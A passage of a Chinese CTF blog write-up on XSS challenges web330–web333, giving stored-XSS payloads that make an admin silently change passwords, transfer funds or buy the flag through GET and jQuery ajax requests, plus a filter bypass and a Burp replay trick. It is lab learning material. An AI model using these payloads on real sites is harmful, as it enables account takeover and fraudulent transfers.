+<h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><p>在修改密码时发现，修改的账号只取决于包里的cookie值</p>
+<p><img src="/../images/4b274185-0720-4d11-af82-27023fad884d.png" srcset="/img/loading.gif" lazyload alt="4b274185-0720-4d11-af82-27023fad884d"></p>
+<p>可以任意修改密码</p>
+<p><img src="/../images/27415cac-32c8-438e-a5c5-fc6c89e50b4c.png" srcset="/img/loading.gif" lazyload alt="27415cac-32c8-438e-a5c5-fc6c89e50b4c"></p>
+<p>用X管理员语句可以获取cookie，但是会一直变，无法直接利用cookie来改密码</p>
+<p>采用与上题类似的方法即可</p>
+<p>或者</p>
+<h4 id="直接让管理员被XSS时，自己修改密码-GET请求-，再利用此密码登录"><a href="#直接让管理员被XSS时，自己修改密码-GET请求-，再利用此密码登录" class="headerlink" title="直接让管理员被XSS时，自己修改密码(GET请求)，再利用此密码登录"></a>直接让管理员被XSS时，自己修改密码(GET请求)，再利用此密码登录</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php?p=1111111&#x27;</span>;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="ip写靶场地址无效，改成127-0-0-1才行，真实情况可能不让外部ip访问此目录"><a href="#ip写靶场地址无效，改成127-0-0-1才行，真实情况可能不让外部ip访问此目录" class="headerlink" title="ip写靶场地址无效，改成127.0.0.1才行，真实情况可能不让外部ip访问此目录"></a>ip写靶场地址无效，改成127.0.0.1才行，真实情况可能不让外部ip访问此目录</h4><h4 id="document被过滤可用window替代"><a href="#document被过滤可用window替代" class="headerlink" title="document被过滤可用window替代"></a>document被过滤可用window替代</h4><h3 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h3><h4 id="利用xss使管理员修改密码的请求方式变为POST"><a href="#利用xss使管理员修改密码的请求方式变为POST" class="headerlink" title="利用xss使管理员修改密码的请求方式变为POST"></a>利用xss使管理员修改密码的请求方式变为POST</h4><h4 id="利用ajax的隐蔽性和灵活性，可取代document-location-href"><a href="#利用ajax的隐蔽性和灵活性，可取代document-location-href" class="headerlink" title="利用ajax的隐蔽性和灵活性，可取代document.location.href"></a>利用ajax的隐蔽性和灵活性，可取代document.location.href</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">p</span>:<span class="hljs-string">&#x27;123&#x27;</span>&#125;&#125;);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p><code>$.ajax()</code></p>
+<ul>
+<li><strong>这是什么？</strong> 这是 <strong>jQuery</strong> 库中用于执行异步HTTP（Ajax）请求的核心函数。Ajax允许网页在不重新加载整个页面的情况下，与服务器交换数据并更新部分网页内容。</li>
+<li><strong>为什么用Ajax？</strong><ul>
+<li><strong>隐蔽性：</strong> 与 <code>document.location.href</code>（会导致浏览器地址栏变化、页面跳转）不同，Ajax请求在后台静默完成。管理员可能只会看到页面稍微“卡顿”了一下，甚至完全察觉不到任何异常，攻击就已经完成了。</li>
+<li><strong>灵活性：</strong> 可以发送各种类型的请求（GET, POST, PUT, DELETE等），并且可以方便地设置发送的数据。</li>
+</ul>
+</li>
+</ul>
+<p><strong>前提条件：</strong> 目标网站的管理后台页面<strong>必须已经加载了jQuery库</strong>，这个攻击脚本才能工作。因为 <code>$</code> 是jQuery的标识符。如果后台没有使用jQuery，这段代码会报错（<code>$ is not defined</code>）。在实际攻击中，攻击者会先侦查目标环境。</p>
+<h3 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h3><p>多了一个转帐界面，正常用户之间无法转账，利用管理员给我们转账即可</p>
+<p><img src="/../images/a1cf486c-24ee-44d3-8282-cced8c1c5826.png" srcset="/img/loading.gif" lazyload alt="a1cf486c-24ee-44d3-8282-cced8c1c5826"></p>
+<h4 id="语句用到了POST多个传参，注意注册的收款账号不要与默认重复"><a href="#语句用到了POST多个传参，注意注册的收款账号不要与默认重复" class="headerlink" title="语句用到了POST多个传参，注意注册的收款账号不要与默认重复"></a>语句用到了POST多个传参，注意注册的收款账号不要与默认重复</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://127.0.0.1/api/amount.php&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">u</span>:<span class="hljs-string">&#x27;lll&#x27;</span>,<span class="hljs-attr">a</span>:<span class="hljs-number">9999</span>&#125;&#125;);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>购买flag即可</p>
+<p><img src="/../images/1fe5dadb-b377-4faa-a540-0338d60fee4f.png" srcset="/img/loading.gif" lazyload alt="1fe5dadb-b377-4faa-a540-0338d60fee4f"></p>
+<h3 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h3><p>方法一：上一题一样的解法</p>
+<p>方法二：</p>
+<h4 id="自己给自己转账可以成功"><a href="#自己给自己转账可以成功" class="headerlink" title="自己给自己转账可以成功"></a>自己给自己转账可以成功</h4><p><img src="/../images/f089410c-dd4e-4ebe-9bdd-e2ba256c1b0e.png" srcset="/img/loading.gif" lazyload alt="f089410c-dd4e-4ebe-9bdd-e2ba256c1b0e"></p>
+<p>用burp重放攻击，购买flag</p>
+<p><img src="/../images/cbed9e4d-2e49-4deb-b764-09cb3bebff38.png" srcset="/img/loading.gif" lazyload alt="cbed9e4d-2e49-4deb-b764-09cb3bebff38"></p>
+<p>方法3：</p>
+<h4 id="XSS直接让admin账户购买flag然后把flag送到我们自己的网站上。"><a href="#XSS直接让admin账户购买flag然后把flag送到我们自己的网站上。" class="headerlink" title="XSS直接让admin账户购买flag然后把flag送到我们自己的网站上。"></a>XSS直接让admin账户购买flag然后把flag送到我们自己的网站上。</h4><p>但是好像只能购买无法查看flag。</p>
+<p>购买语句</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://127.0.0.1/api/getFLAG.php&#x27;</span>;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>XSS告一段落</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTF-XSS</div>
+      <div>http://maskobito.github.io/2025/03/19/CTF-XSS/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>MaskObito</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/typing-effect.js"></script>
+<script src="/js/particle.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
